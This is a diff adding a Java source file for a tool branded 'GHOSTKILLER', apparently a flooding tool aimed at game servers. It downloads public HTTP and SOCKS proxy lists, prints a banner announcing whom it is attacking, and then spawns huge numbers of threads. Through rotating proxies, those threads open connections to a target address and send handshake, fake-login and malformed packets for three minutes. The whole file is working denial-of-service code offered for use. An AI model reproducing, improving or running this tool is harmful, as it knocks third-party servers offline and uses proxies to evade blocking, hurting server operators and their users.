@@ -1,0 +1,210 @@
+package com.killer.ghost;
+
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.InetSocketAddress;
+import java.net.Proxy;
+import java.net.Socket;
+import java.net.URL;
+import java.net.URLConnection;
+import java.net.Proxy.Type;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Random;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+public class Main {
+   private static List<String> proxyList = new ArrayList();
+   private static List<Thread> threads = new ArrayList();
+   static String ip;
+   static int ping = 0;
+   static String porta;
+   static long tempo = 180000L;
+   static Random random = new Random();
+   static Integer maxThreads = 1000000000;
+   static final Pattern regex = Pattern.compile("[a-fA-F0-9]{32}", 32);
+   private static int nextProxy = -1;
+   private static int proxySize = -1;
+
+   public static void main(String[] args) {
+      Thread.setDefaultUncaughtExceptionHandler(new ExceptionHandling());
+      if (args[0] != null) {
+         ip = args[0].split(":")[0];
+         porta = args[0].split(":")[1];
+      }
+
+      loadProxies("https://www.proxy-list.download/api/v1/get?type=http", "http");
+      loadProxies("https://www.proxy-list.download/api/v1/get?type=https", "http");
+      loadProxies("https://www.proxy-list.download/api/v1/get?type=socks4", "socks");
+      loadProxies("https://www.proxy-list.download/api/v1/get?type=socks5", "socks");
+      loadProxies("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt", "http");
+      loadProxies("https://raw.githubusercontent.com/shiftytr/proxy-list/master/http.txt", "http");
+      loadProxies("https://raw.githubusercontent.com/shiftytr/proxy-list/master/https.txt", "http");
+      loadProxies("https://raw.githubusercontent.com/shiftytr/proxy-list/master/socks4.txt", "socks");
+      loadProxies("https://raw.githubusercontent.com/shiftytr/proxy-list/master/socks5.txt", "socks");
+      loadProxies("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", "http");
+      loadProxies("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&anonymity=all&timeout=10000", "socks");
+      loadProxies("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&anonymity=all&timeout=10000", "socks");
+      loadProxies("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&timeout=10000", "http");
+      System.out.print("\u001b[H\u001b[2J");
+      System.out.flush();
+      System.out.flush();
+      System.out.println("  ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓ ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███  \n ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒ ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒\n▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒\n░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░ ▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄  \n░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░ ▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒\n ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░\n  ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░    ░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░\n░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░      ░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░ \n      ░  ░  ░  ░    ░ ░        ░           ░  ░    ░      ░  ░    ░  ░   ░  ░   ░     \n                                                                                      ");
+      System.out.println("\u001b[0m                                                   Developed by: \u001b[35m$DK' Daniel#5784");
+      System.out.println("\u001b[90m================================================================================");
+      System.out.println("\u001b[97m    Attacking: \u001b[91m" + ip + ":" + porta + "\u001b[97m with \u001b[94m" + maxThreads + "\u001b[97m threads and \u001b[94m" + proxyList.size() + "\u001b[97m proxies.");
+      System.out.println("\u001b[0m");
+      ThreadGroup threadgroup = Thread.currentThread().getThreadGroup();
+      long time = System.currentTimeMillis();
+      new InetSocketAddress(ip, Integer.parseInt(porta));
+
+      while(System.currentTimeMillis() - time <= tempo) {
+         int totalThreads = threadgroup.activeCount() - 2;
+
+         try {
+            for(int k = 0; k < maxThreads - totalThreads; ++k) {
+               (new Thread(() -> {
+                  try {
+                     while(true) {
+                        Proxy proxy;
+                        Object socket;
+                        DataOutputStream out;
+                        try {
+                           proxy = getRandomProxy();
+                           socket = proxy.type() == Type.HTTP ? new SocketHttp(ip, Integer.parseInt(porta), proxy.address(), 10000) : new Socket(proxy);
+                           ((Socket)socket).connect(new InetSocketAddress(ip, Integer.parseInt(porta)));
+                           out = new DataOutputStream(((Socket)socket).getOutputStream());
+                           PacketUtils.sendPacket(PacketUtils.createHandshakeMessage18(ip, Integer.parseInt(porta), 2), out);
+                           if (random.nextBoolean()) {
+                              PacketUtils.sendPacket(PacketUtils.createLogin("GhostBest" + random.nextInt(9999)), out);
+                           } else if (random.nextBoolean()) {
+                           }
+
+                           ((Socket)socket).close();
+                        } catch (Exception var5) {
+                        }
+
+                        try {
+                           proxy = getRandomProxy();
+                           socket = proxy.type() == Type.HTTP ? new SocketHttp(ip, Integer.parseInt(porta), proxy.address(), 10000) : new Socket(proxy);
+                           ((Socket)socket).connect(new InetSocketAddress(ip, Integer.parseInt(porta)));
+                           out = new DataOutputStream(((Socket)socket).getOutputStream());
+                           out.write(-71);
+
+                           for(int i = 0; i < 4; ++i) {
+                              out.write(1);
+                              out.write(0);
+                           }
+                        } catch (Exception var4) {
+                        }
+                     }
+                  } catch (Exception var6) {
+                  }
+               })).start();
+            }
+
+            Thread.sleep(10L);
+         } catch (Exception var7) {
+            var7.printStackTrace();
+         }
+      }
+
+   }
+
+   public static Proxy getRandomProxy() {
+      ++nextProxy;
+      if (proxySize == -1) {
+         proxySize = proxyList.size();
+      }
+
+      if (nextProxy >= proxySize) {
+         nextProxy = 0;
+      }
+
+      String proxy = (String)proxyList.get(nextProxy);
+      return new Proxy(proxy.split(";")[1].equals("http") ? Type.HTTP : Type.SOCKS, new InetSocketAddress(proxy.split(";")[0].split(":")[0], Integer.parseInt(proxy.split(";")[0].split(":")[1])));
+   }
+
+   public static void loadProxies(String url, String type) {
+      try {
+         URLConnection connection;
+         if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
+            connection = null;
+
+            try {
+               File file = new File(url);
+               if (!file.exists()) {
+                  file.createNewFile();
+               }
+
+               FileReader fileReader = new FileReader(url);
+               BufferedReader bufferedReader = new BufferedReader(fileReader);
+
+               while(true) {
+                  String line;
+                  do {
+                     if ((line = bufferedReader.readLine()) == null) {
+                        bufferedReader.close();
+                        return;
+                     }
+
+                     line = getIP(line);
+                     if (type.equalsIgnoreCase("http") || type.equalsIgnoreCase("https") || type.equalsIgnoreCase("ssl") || type.equalsIgnoreCase("both")) {
+                        proxyList.add(line + ";http");
+                     }
+                  } while(!type.equalsIgnoreCase("socks4") && !type.equalsIgnoreCase("socks5") && !type.equalsIgnoreCase("socks") && !type.equalsIgnoreCase("both"));
+
+                  proxyList.add(line + ";socks");
+               }
+            } catch (FileNotFoundException var7) {
+               System.out.println(" ");
+               System.out.println("\u001b[31m                    ! ERROR !");
+               System.out.println("\u001b[31m           Proxies file is not found");
+               System.out.println("\u001b[0m ");
+            } catch (IOException var8) {
+               System.out.println(" ");
+               System.out.println("\u001b[31m                    ! ERRO !");
+               System.out.println("\u001b[31m          Proxy file could not be read");
+               System.out.println("\u001b[0m ");
+            }
+         } else {
+            connection = (new URL(url)).openConnection();
+            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36");
+            connection.setConnectTimeout(5000);
+            connection.connect();
+            BufferedReader r = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+
+            String line;
+            while((line = r.readLine()) != null) {
+               line = getIP(line);
+
+               try {
+                  if (type.equalsIgnoreCase("http") || type.equalsIgnoreCase("https") || type.equalsIgnoreCase("ssl")) {
+                     proxyList.add(line + ";http");
+                  }
+
+                  if (type.equalsIgnoreCase("socks4") || type.equalsIgnoreCase("socks5") || type.equalsIgnoreCase("socks")) {
+                     proxyList.add(line + ";socks");
+                  }
+               } catch (Exception var9) {
+                  var9.printStackTrace();
+               }
+            }
+         }
+      } catch (Exception var10) {
+         var10.printStackTrace();
+      }
+
+   }
+
+   public static String getIP(String string) {
+      Matcher m = Pattern.compile("(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}):(\\d{1,5})").matcher(string);
+      return m.find() ? m.group() : null;
+   }
+}
